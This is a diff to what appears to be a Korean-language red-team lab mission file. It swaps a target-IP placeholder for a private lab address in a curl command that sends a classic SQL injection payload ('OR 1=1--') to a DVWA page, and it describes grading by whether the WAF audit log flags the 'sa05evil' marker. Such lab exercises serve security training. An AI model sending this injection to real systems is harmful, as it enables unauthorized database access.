@@ -43,9 +43,9 @@ red_missions:
       ### 할 일 (attacker-ext)
       ```bash
       curl -s -A "sa05evil-scanner/1.0" -H "Host: dvwa.6v6.lab" \
-        "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa05evil%27%20OR%201=1--+&Submit=Submit"
+        "http://192.168.0.161/vulnerabilities/sqli/?id=sa05evil%27%20OR%201=1--+&Submit=Submit"
       ```
-      `<대상_공개IP>` = solo 면 본인, duel 이면 상대.
+      `192.168.0.161` = solo 면 본인, duel 이면 상대.
 
       ### 채점 방법
       대상 WAF audit(modsec)에 **IOC `sa05evil` 가 포함된 공격 탐지** 가 남았는지로 채점.
